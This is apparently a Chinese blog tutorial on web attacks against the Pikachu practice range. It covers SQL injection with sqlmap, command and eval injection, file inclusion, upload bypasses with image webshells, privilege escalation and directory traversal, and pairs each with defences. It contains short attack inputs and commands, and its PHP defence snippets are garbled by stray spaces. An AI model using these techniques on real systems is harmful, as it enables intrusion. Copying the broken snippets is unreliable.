![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F75bda3ff11d4438d99c44aa44602daca.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
用这个方法我们可以猜出表名。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fdbdc7f3b58544e1781f5052185fe52d4.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
同样的我们也可以用第二个payload猜出列名。

#### 3.4.11如何使用SQL-Map进行SQL Inject漏洞测试

可以直接去官网下载压缩包[https://sqlmap.org/](https://sqlmap.org/)-
sqlmap经典用法-
第一步:-
\-u "xx” - cookie= “yy” //带上cookie对URL进行注入探测-
第二步:-
\-U “xxx” – cookie=-
“yyy” - current-db //对数据库名进行获取-
第三步:-
\-u "xxx” --cookie= “yy” - D pikachu - -tables //对数据库的表名进行枚举-
第四步:-
\-u “xxx” --cookie= “yyy” -D pikachu -T users – columns //对dvwa库里面的名为users表的列名进行枚举

#### 3.4.12SQL注入漏洞常见防范措施

●代码层面-
1.对输入进行严格的转 义和过滤-
2.使用预处理和参数化 ( Parameterized )-
●网路层面-
1.通过WAF设备启用防SQL Inject注入策略(或类似防护系统)-
2.云端防护( 360网站卫士,阿里云盾等)-
PHP防范转义+过滤

> 转义举例
> 
>     function escape($link, $data){
>     if(is_ string($data)){
>     return mysqli_ real_ escape_ string($ink, $data) ;
>     }
>     if(is_ array($data)){
>     foreach ($data as $key=>$va1){ 
>     $data[$key]=e S cape($link, $val);
>     }
>     }
>     return $data;
>     }
>     
>          

> 过滤举例：(黑名单)
> 
>     str_ replace("%",",$_ POST['username ]),把post里面的数据里面含有%的替换成空
>     
>          

**PDO预处理**-
推荐做法：使用PDO的prepare预处理(预处理+参数化)

    $username=$_ GET[ ' username' ];
    $password=$_ GET[ ' password'];
    try{
    $pdo=new PDO( ' mysql : host=localhost ; dbname-ant', ' root'，' root');
    $sq1="select * from admin where username=? and passowrd=?" ;
    $stmt=$pdo->prepare ($sql);//先不传参数，先预处理
    //var_ dump($stmt);
    $stmt-> execute(array($username ，$password));
    / /这个时候在把参数传进去，以索引数组的方式传进去，而不是拼接，就成功防止了注入
    }catch (PDOException $e){
    echo $e- >getMessage();
    ?>
    
    
        

网络防护-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F53e76687176340a79ea487535764cce7.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F286ab9fc70bf46d5adb03706cefc47d7.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

## 3.5RCE（代码执行/命令执行）

RCE(remote command/code execute)概述-
RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。-
远程系统命令执行-
一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口-
比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上-
一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器-
现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过"自动化运维平台"进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的"收获"-\_-

    远程代码执行
    同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 
    因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。 
    
        

打开pikachu靶场exec"ping"，可以先试一下本地地址，ping127.0.0.1。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F007ac6d2ceaf47f4a00bc99f0ca29c87.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ping出来的结果很正常，但是这个中文全变成乱码了。/(ㄒoㄒ)/~~-
查看源码，发现对输入没有处理之后我们还是一手拼接

    127.0.0.1 & ipconfig
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7b490d70de1349318c34845ddc71c2cd.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
依旧乱码，不过结果一样，说明这里除了可以提交目标IP地址外，还可以通过一些拼接的符号执行其他的命令。

exec"evel"，更简单。随意输入字符，返回文字。-
eval(输入)也就是执行任何我们输入的数据，输入phpinfo();-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F8231e96001df4ad68c6d94e7edff8420.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
那么这里学习一个php函数-
system("")执行外部程序，并且显示输出。

## 3.6Files Inclusion(文件包含漏洞)

#### 3.6.1文件包含原理及本地文件包含漏洞

文件包含漏洞概述-
在web后台开发中，程序员往往为了提高效率以及让代码看起来更加简洁，会使用”包含"函数功能。-
比如把一系列功能函数都写进fuction.php中,之后当某个文件需要调用的时候就直接在文件头中写上-
一句<?php include fuction.php?>就可以调用函数代码。-
但有些时候,因为网站功能需求，会让前端用户选择需要包含的文件(或者在前端的功能中使用了”包含”功能)，又由于开发人员没有对要包含的这个文件进行安全考虑,就导致攻击着可以通过修改包含文件的位置来让后台执行任意文件(代码)。这种情况我们称为"文件包含漏洞”-
文件包含漏洞有"本地文件包含漏洞”和"远程文件包含漏洞”两种情况。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fba8f02b690c940ca9cb0f85729c8f86d.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
通过include()或require()语句,可以将PHP文件的内容插入另一一个PHP文件(在服-
务器执行它之前)。-
include和require语句是相同的，除了错误处理方面:-
require会生成致命错误( E\_ COMPILE ERROR )并停止脚本-
include只生成警告( E WARNING ) ,并且脚本会继续

    Test. php: 
    <?php $co1or= '银色的' ; $car= '奔驰轿车'; ?>
    Index. html :
    <html> <body> <h1> 欢迎访问我的首页! </h1>
    <?php include
    'test .php'; echo "我有一辆”.
    $color . $car "
    ?>
    </body> </html>
    
    
        

打开 file include 本地文件包含，点击wyd提交查询。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F8fef9248890a48c59f81908f54438dba.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

我们观察url，显示是一个文件file1.php。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0a2d2a68c42c49ae9f31ca1c4760410e.png)-
按照设计这些文件都是后台自己存在的文件。但是由于这个文件名是前端传向后台的，也就意味着我们可以修改这个文件。-
我们可以猜测一下后台的操作系统是win11，其中有很多固定的配置文件例如…/…/…/…/…/…/-
可以多敲几个，最后都会跳到根目录。我们将文件名替换

    ../../../../Windows/System32/drivers/etc/hosts
    
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F642078dc8e874c2a96b1360d51ff4ed4.png)-
所有的配置文件就暴露出来了。

#### 3.6.2远程文件包含漏洞

远程文件包含漏洞形式跟本地文件包含漏洞差不多,在远程包含漏洞中,攻击者可以通过访问外部地址来加载远程的代码。-
远程包含漏洞前提:如果使用的incldue和require ,则需要php.ini配置如下( php5.4.34 ) ：-
allow\_url\_fopen=on//默认打开-
Allow\_url\_include=on//默认关闭-
写入一句话木马，危害极大。-
我们现在phpstudy打开远程包含，否则无法进行靶场训练。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F499a0bce95054c55b257f663eae04a8b.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
还是选择一个文件提交，显示图片文字，观察url。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6c88c2f614684c94b2efb496dcf2cbee.png)-
它实际上提交的是一个目标文件的路径。我们可以改成一个远端的路径，读取远程文件。

    http://pikachu/test/yijuhua.txt
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F16e6049aa2134a6893cfb6aa3f08434f.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
将文件替换为远端路径，回车，会在本地生成php文件。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fe469a8f9dacc44fd8f6d156cf93e11cf.png)-
对x传参，x=ifconfig。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F11f9080871f146f8b0b43b466354dd91.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
乱码是因为靶场搭载windows上了。也可以使用哥斯拉、冰蝎等工具。

#### 3.6.3文件包含漏洞防范措施

0.在功能设计上尽量不要将文件包含函数对应的文件放给前端进行选择和操作。-
1.过滤各种./. ,http:// ，https://-
2.配置php.ini配置文件:-
allow\_ url fopen = off-
Allow\_ url include= off-
magic quotes\_ gpc=on //gpc在-
3.通过白名单策略，仅允许包含运行指定的文件,其他的都禁止。

## 3.7 Unsafe file downloads(不安全的文件下载)

很多网站都会提供文件下载功能，即用户可以通过点击下载链接,下载到链接所对应的文件。但是，如果文件下载功能设计不当，则可能导致攻击着可以通过构造文件路径，从而获取到后台服务器上的其他的敏感文件。( 又称:任意文件下载)-
打开 unsafe filedownload 不安全的文件下载，正常功能点击球员名字，就可以下载图片。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc5e85c6184c74653a3971f794e92d63e.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_17%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

我们观察点击名字后的url。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F1f4c4efbdd1b4e75802cd659bd8da81e.png)-
相当于把ai.png传到后台，后台去找这个文件，把文件读取之后，传到前端下载。-
我们点击科比，将url，改为ai.png。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fff6c3d98010e4a7da3599552c14ad490.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

我们还可以使用目录遍历的方式去修改链接下载敏感文件。-
防范措施：-
1.对传入的文件名进行严格的过滤和限定-
2.对文件下载的目录进行严格的限定

## 3.8 Unsafe file uploads(不安全的文件上传)

#### 3.8.1不安全的文件上传原理及客户端绕过

因为业务功能需要,很多web站点都有文件上传的接口,比如:-
1.注册时上传头像图片(比如jpg.png,gif等) ;-
2.上传文件附件( doc,xIs等) ;-
而在后台开发时并没有对上传的文件功能进行安全考虑或者采用了有缺陷的措施，导致攻击者可以通过一些手段绕过安全措施从而上传一些恶意文件(如:一句话木马)从而通过对该恶意文件的访问来控制整个web后台。

文件上传漏洞测试流程：-
1，对文件上传的地方按照要求上传文件，查看返回结果(路径，提示等);-
2 ，尝试上传不同类型的“恶意"文件，比如xx.php文件,分析结果;-
3，查看html源码，看是否通过js在前端做了上传限制，可以绕过;-
4 ，尝试使用不同方式进行绕过:黑白名单绕过/MIME类型绕过/目录0x00截断绕过等;-
5，猜测或者结合其他漏洞(比如敏感信息泄露等)得到木马路径,连接测试。

打开 unsafe upfileupload 客户端check，我们浏览上传文件发现，只能上传照片。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc3e21d19854d4599979c30ddd38672bb.png)-
上传其他类型的文件会被前端提示，这个限制就有可能是从前端进行限制的。打开浏览器控制台查看。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6bff73a8b1d6465492bbd4c2fad4d594.png)-
再查看源码-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0b930f72939f4f9597c9c8adb473b3da.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_19%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
通过前端对文件进行了限制。我们可以直接修改代码，把onchange的函数删掉。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc34f3adbcb20408e93ae9f64a947fba3.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd050f4f1363848b7b2b503e7d39a3614.png)-
php文件一句话木马成功上传。之后就可以给特定值传命令，执行操作。

#### 3.8.2上传漏洞之MINE type验证原理和绕过

MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。-
每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。常见的MIME类型，比如:-
超文本标记语言文本.html.html texthtml-
普通文本.txt text/plain-
RTF文本.rtf application/rtf-
GIF图形.gif image/gif-
JPEG图形.ipeg.jpg image/jpeg

> 通过使用PHP的全局数组$\_ FILES ,你可以从客户计算机向远程服务器上传文件。-
> 第一个参数是表单的input name，第二个下标可以是"name", “type”, “size”, “tmp\_ name” 或"error"

同样先测试功能，上传图片没有问题，点击上传php文件，有错误提示。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0a5d3e05c61449818f01bd75262b00bc.png)-
先上传一个正常的图片，在上传一个php文件，打开burp抓包。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F74062b65fa5a417cab41e8868e01a341.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
上传图片，显示image/png上传成功。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F08e85eebdcd44b848362031ea0d7f9e7.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
上传php文件，显示application/octet-stream上传失败。将上传php文件的包发送到repeater，将application/octet-stream修改为image/png。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F017a9b913c364bdf899295fdfe65b468.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
通过http头的修改绕过了MINE type验证成功乱搞。之后就是访问传参，通过一句话木马控制服务器。

#### 3.8.3文件上传之getimagesize绕过和防范措施

Getimagesize ( )返回结果中有文件大小和文件类型,如果用这个函数来获取类型，从而判断是否是图片的话，会存在问题。-
是否可以绕过呢?可以，因为图片头可以被伪造。-
图片木马的制作:-
方法1 :直接伪造头部GIF89A-
方法2.CMD: copy /b test.png + muma.php ccc.png-
方法3.使用GIMP (开源的图片修改软件) , 通过增加备注,写入执行命令-
测试功能，没有问题，开始制作木马图片。这里使用第二种方法。-
进入桌面，先输入命令dir，保证可以找到你需要的文件。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F8b2135f4895647c2a75fdaf82a91ef56.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

生成木马图片。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F1ebb3ffd4fa94c4e930f0714d24f850f.png)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F182caf6de9c9435aaa97fe4409f184e9.png)-
打开展示完全没有问题，但是在16进制中图片内容加入了一句话木马内容。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fa36da2374c8d4c86a0fe84f2c6257abb.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
成功上传木马图片。我们访问这个图片但是一句话并没有执行，这时候就需要结合本地文件包含漏洞搞事情。打开文件包含漏洞 file include，上传图片，修改路径。就可以执行phpinfo。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc23cce7a54f44f9a9e9b7a92c0704fe4.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
防范措施：-
不要在前端使用JS实施上传限制策略-
通过服务端对上传文件进行限制:-
1.进行多条件组合检查:比如文件的大小，路径，扩展名,文件类型，文件完整性-
2.对上传的文件在服务器上存储时进行重命名(制定合理的命名规则)-
3.对服务器端上传文件的目录进行权限控制(比如只读)， 限制执行权限带来的危害

## 3.9 Over Permisson(越权漏洞)

#### 3.9.1越权漏洞原理及水平越权

越权漏洞概述-
由于没有用户权限进行严格的判断，导致低权限的账号(比如普通用户)可以去完成高权限账号( 比如超级管理员)范围内的操作。-
平行越权: A用户和B用户属于同一级别用户,但各自不能操作对方个人信息, A用户如果越权操作B用户的个人信息的情况称为平行越权操作-
垂直越权。A用户权限高于B用户 , B用户越权操作A用户的权限的情况称为垂直越权。-
越权漏洞属于逻辑漏洞,是由于权限校验的逻辑不够严谨导致。-
每个应用系统其用户对应的权限是根据其业务功能划分的,而每个企业的业务又都是不一样的。-
因此越权漏洞很难通过扫描工具发现出来,往往需要通过手动进行测试。

平行越权，先进行登录，提示里查看账号密码。有一个功能点击查看个人信息。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F207138b5266e4c45bca56916910ae19d.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_17%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
再点击按钮时，向后台提供了一个get请求。提供了当前用户的用户名，然后后台将其信息返回到前台。我们在url中把Lucy改成其他人看看能不能查到信息。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6d508ad9401a4b5cb116c314341b41a9.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_18%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
虽然登录的是Lucy的账号但是返回了lili的信。

#### 3.9.2垂直越权

先登录超级管理员，去执行只有管理员才可以操作的新增账号的功能，用burp抓包。退出登录。登录普通用户，执行新增账号操作。如果成功，则存在垂直越权漏洞。-
登录管理员。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F3afda4c4846f46a0b05786209955f4d1.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
添加用户。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F5fcf6ee05e1d4512972df971d84442ad.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
burp进行抓包并发送到repeater中。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F894d83ce8fc24e759b70380d13ace80f.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
退出登录，在repeater中执行。返回登录界面，要求登录。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fdbb27ddd40484271a145b735aa58dc2c.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_13%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
重新登录管理员，查看是否添加成功。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0fed86b6ea3046dca02b2ea69275a76e.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
只有一个666，添加失败。退出登录，登录普通用户。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd9ad464cb7034d92a6a7d2edc76728e8.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
刷新页面，在burp获取页面。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F4477d438321e406f8a62d690e2b8b520.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
cookie就是普通用户的登录态。Cookie: PHPSESSID=vfh1qvv694tj1dppt3bamvnhf1-
然后找到之前添加用户的post请求，发送到repeater。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fa7bead8f243c49b899ef5bbb6abc1077.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_18%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
目前的管理员登录态是退出的，现在我们把这个登录态换成现在登录的普通用户的登录态。以普通用户的身份执行管理员操作。点击执行。返回pikachu，刷新页面。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd664b3f505774b5da5dc49625b719bc9.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
又出现了一个666用户，说明存在垂直越权漏洞。

## 3.10 …/…/…/(目录遍历)

目录遍历漏洞概述-
在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“…/”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。-
看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。-
需要区分一下的是,如果你通过不带参数的url（比如：http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。 而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在"i can see you ABC"中了解更多）-
我们点击超链接-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F9362b4837a8b4ac2b40feca3caee7147.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
实际上是向后台发送了一个文件名。我们可以修改文件名。修改成…/dir.php上级目录下的dir.php，可以发挥想象访问更多内容。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F71c11ca3296a46bb9324dd6da9f3f8c4.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

## 3.11 I can see your ABC(敏感信息泄露)

    由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：
    ---通过访问url下的目录，可以直接列出目录下的文件列表;
    ---输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;
